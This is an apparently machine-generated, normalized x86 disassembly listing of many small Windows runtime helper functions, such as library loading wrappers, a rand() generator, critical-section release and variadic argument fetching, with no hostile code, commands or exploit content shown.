push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetProcAddress@IAT ]
pop ebp
retn
sub_416ed6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_416ee2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_416ef2
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeLibrary@IAT ]
and [ esi ] 0x0
sub_416f09
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_416f15
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xe06d7363
sete al
pop ebp
retn
sub_416f28
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeLibrary@IAT ]
and [ esi ] 0x0
sub_416f3f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ FreeLibrary@IAT ]
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_417054
mov esp [ ebp - 0x18 ]
call sub_42d238
sub_41705f
push 0x2
call sub_42f0c3
pop ecx
retn
sub_4170b5
xor eax eax
retn
sub_4170fc
call sub_430333
test al al
jne r-xdata
mov eax [ fs : 0x30 ]
mov eax [ eax + 0x68 ]
shr eax 0x8
not al
and al 0x1
retn
retn
sub_417181
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_416f55
add esp 0xc
pop ebp
retn
sub_417197
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4171a6
push 0x1
push 0x2
push 0x0
call sub_416f55
add esp 0xc
retn
sub_4171b5
push 0x1
push 0x0
push 0x0
call sub_416f55
add esp 0xc
retn
sub_4171c4
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_416f55
add esp 0xc
pop ebp
retn
sub_4171da
mov eax [ rw-data ]
retn
sub_417218
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_416f55
add esp 0xc
pop ebp
retn
sub_41722e
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_416f55
add esp 0xc
pop ebp
retn
sub_417244
call sub_430a7e
imul ecx [ eax + 0x18 ] 0x343fd
add ecx 0x269ec3
mov [ eax + 0x18 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_417265
mov edi edi
push ebp
mov ebp esp
call sub_430a7e
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
pop ebp
retn
sub_417277
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_417289
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_417299
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4172a9
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_4172bb
mov eax [ ecx ]
retn
sub_4172be
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_4172c4
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_417454
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4175a0
test esi esi
jne r-xdata
push [ ebp - 0x1c ]
call sub_417454
pop ecx
retn
push [ ebp - 0x1c ]
call sub_4315d8
pop ecx
sub_417661
test esi esi
jne r-xdata
push [ ebp - 0x1c ]
call sub_417454
pop ecx
retn
push [ ebp - 0x1c ]
call sub_4315d8
pop ecx
sub_4176be
mov eax [ ecx ]
retn
sub_4176c1
push [ ecx ]
call sub_417454
pop ecx
retn
sub_4176ca
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_4176d2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4174f6
sub_4176dd
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4175b7
add esp 0xc
pop ebp
retn
sub_41773b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4175b7
sub_417746
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4174f6
add esp 0xc
pop ebp
retn
sub_4177a4
mov eax [ ecx ]
mov eax [ eax + 0xc ]
retn
sub_4177aa
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xd
and eax 0x1
retn
sub_4177b6
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
and eax 0x1
retn
sub_4178ae
push [ ebp - 0x20 ]
call sub_417454
pop ecx
retn
sub_4178fd
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_417931
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_417965
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_417995
push [ ecx ]
movzx eax [ ecx + 0x4 ]
push eax
call sub_432f75
pop ecx
pop ecx
retn
sub_4179a4
push [ ecx ]
call sub_417440
pop ecx
retn
sub_4179f3
push [ ecx ]
call sub_417454
pop ecx
retn
sub_4179fc
mov eax [ ecx ]
mov eax [ eax + 0xc ]
and eax 0x4c0
neg eax
sbb eax eax
neg eax
retn
sub_417a0d
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_417a24
mov eax [ ecx ]
mov eax [ eax + 0xc ]
test al 0xc0
push 0x0
pop eax
setne al
retn
sub_417eef
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_417f40
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_417f91
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_417fe2
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_418033
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_418084
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417454
pop ecx
retn
sub_419031
mov eax [ ecx + 0x404 ]
test eax eax
jne r-xdata
retn
mov eax ecx
sub_41903e
mov eax [ ecx + 0x404 ]
test eax eax
jne r-xdata
retn
mov eax ecx
sub_419935
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cl [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
mov al 0x1
pop ebp
retn 0x4
sub_41994f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cl [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cl
mov al 0x1
pop ebp
retn 0x4
sub_41a065
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a083
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a0a1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a0bf
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41a2d5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a2ef
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a309
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a323
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a33d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a3d5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a3ef
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a409
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a4a1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a4bb
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a4d5
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a56d
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a587
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a5a1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a639
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a653
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a865
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a87f
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a899
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41a8b3
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_41b2fd
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b319
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b335
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b351
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov cx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
mov al 0x1
pop ebp
retn 0x4
sub_41b36d
push 0x3
pop eax
retn
sub_41b371
push 0x3
pop eax
retn
sub_41b375
push 0x3
pop eax
retn
sub_41b379
push 0x3
pop eax
retn
sub_41b37d
push 0x3
pop eax
retn
sub_41b381
push 0x3
pop eax
retn
sub_41b385
push 0x3
pop eax
retn
sub_41b389
push 0x3
pop eax
retn
sub_41b38d
push 0x3
pop eax
retn
sub_41b391
push 0x3
pop eax
retn
sub_41b395
push 0x3
pop eax
retn
sub_41b399
push 0x3
pop eax
retn
sub_41b4d9
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b4e9
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b4f9
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b50a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0x70
sete al
pop ebp
retn
sub_41b614
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax ]
pop ebp
retn
sub_41b620
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax ]
pop ebp
retn
sub_41b62c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
pop ebp
retn
sub_41b639
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
pop ebp
retn
sub_41b646
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b652
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b65e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b66a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b676
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b682
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b68e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b69a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ebp
retn
sub_41b6a6
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
pop ebp
retn
sub_41b6b5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
pop ebp
retn
sub_41b6c4
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
pop ebp
retn
sub_41b6d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
pop ebp
retn
sub_41b714
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov al [ eax - 0x4 ]
pop ebp
retn
sub_41b726
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov al [ eax - 0x4 ]
pop ebp
retn
sub_41b738
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_41b74b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_41b75e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b770
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b782
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b794
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7a6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b7ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b800
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b812
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b824
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b836
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b848
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b85a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b86c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_41b87e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov edx [ eax ]
mov eax [ edx - 0x8 ]
mov edx [ edx - 0x4 ]
pop ebp
retn
sub_41b893
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov edx [ eax ]
mov eax [ edx - 0x8 ]
mov edx [ edx - 0x4 ]
pop ebp
retn
sub_41b8a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov edx [ eax ]
mov eax [ edx - 0x8 ]
mov edx [ edx - 0x4 ]
pop ebp
retn
sub_41b8bd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
j_sub_419019
jmp sub_419019
sub_41c601
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c63b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c675
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c6af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c6c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c6fb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c735
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c747
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c759
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c76b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c77d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41c78f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41cbb0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41cbc0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41cbd0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41cbe0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_41cc73
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ edx ]
mov [ ecx + 0x4 ] eax
mov eax ecx
and [ edx ] 0x0
pop ebp
retn 0x4
sub_41cc8b
and [ ecx + 0x400 ] 0x0
mov eax ecx
and [ ecx + 0x404 ] 0x0
retn
sub_41cc9c
add ecx 0x40
jmp sub_41cdad
sub_41cca4
add ecx 0x40
jmp sub_41cdad
sub_41ccac
add ecx 0x40
jmp sub_41cdad
sub_41ccb4
add ecx 0x40
jmp sub_41cdad
sub_41ccbc
add ecx 0x40
jmp sub_41cdad
sub_41ccc4
add ecx 0x40
jmp sub_41cdad
sub_41cccc
add ecx 0x40
jmp sub_41cdad
sub_41ccd4
add ecx 0x40
jmp sub_41cdad
sub_41ccdc
add ecx 0x40
jmp sub_41cdad
sub_41cce4
add ecx 0x40
jmp sub_41cdad
sub_41ccec
add ecx 0x40
jmp sub_41cdad
sub_41ccf4
add ecx 0x40
jmp sub_41cdad
sub_41ccfc
add ecx 0x40
jmp sub_41cdad
sub_41cd04
add ecx 0x40
jmp sub_41cdad
sub_41cd0c
add ecx 0x40
jmp sub_41cdad
sub_41cd14
add ecx 0x40
jmp sub_41cdad
sub_41cd1c
add ecx 0x40
jmp sub_41cdad
sub_41cd24
add ecx 0x40
jmp sub_41cdad
sub_41cd2c
add ecx 0x40
jmp sub_41cdad
sub_41cd34
add ecx 0x40
jmp sub_41cdad
sub_41cd3c
add ecx 0x40
jmp sub_41cdad
sub_41cd44
add ecx 0x40
jmp sub_41cdad
sub_41cd4c
add ecx 0x40
jmp sub_41cdad
sub_41cd54
add ecx 0x40
jmp sub_41cdad
sub_41cd5c
add ecx 0x40
jmp sub_41cdad
sub_41cd64
add ecx 0x40
jmp sub_41cdad
sub_41cd6c
add ecx 0x40
jmp sub_41cdad
sub_41cd74
add ecx 0x40
jmp sub_41cdad
sub_41cd7c
add ecx 0x40
jmp sub_41cdad
sub_41cd84
add ecx 0x40
jmp sub_41cdad
sub_41cd8c
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
mov eax [ ecx ]
and [ eax + 0x350 ] 0xfffffffd
sub_41cd9c
mov edx [ ecx ]
cmp [ edx ] 0x0
jne r-xdata
retn
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov [ edx ] eax
sub_41cdad
mov edi edi
push esi
mov esi ecx
push [ esi + 0x404 ]
call sub_42d3b1
and [ esi + 0x404 ] 0x0
pop ecx
pop esi
retn
sub_41cdeb
push [ ecx ]
call sub_417454
pop ecx
retn
sub_41ceb1
push [ ecx ]
call sub_417440
pop ecx
retn
sub_41cfbb
push [ ecx ]
call sub_417454
pop ecx
retn
sub_41d081
push [ ecx ]
call sub_417454
pop ecx
retn
sub_41d08a
push [ ecx ]
call sub_417440
pop ecx
retn
sub_41d150
push [ ecx ]
call sub_417440
pop ecx
retn
sub_41d25a
push [ ecx ]
call sub_417454
pop ecx
retn
sub_41d263
push [ ecx ]
call sub_417440
pop ecx
retn
sub_41d26c
push [ ecx ]
call sub_417440
pop ecx
retn
sub_41d275
push [ ecx ]
call sub_417454
pop ecx
retn
sub_41d27e
push [ ecx ]
call sub_417454
pop ecx
retn
sub_41d287
push [ ecx ]
call sub_417440
pop ecx
retn
sub_41d34d
lea eax [ ecx + 0x4 ]
retn
sub_41d5e9
inc [ ecx + 0x450 ]
xor eax eax
cmp [ ecx + 0x450 ] 0x2
setne al
retn
sub_41d5fc
inc [ ecx + 0x450 ]
xor eax eax
cmp [ ecx + 0x450 ] 0x2
setne al
retn
sub_41d60f
inc [ ecx + 0x450 ]
xor eax eax
cmp [ ecx + 0x450 ] 0x2
setne al
retn
sub_41d622
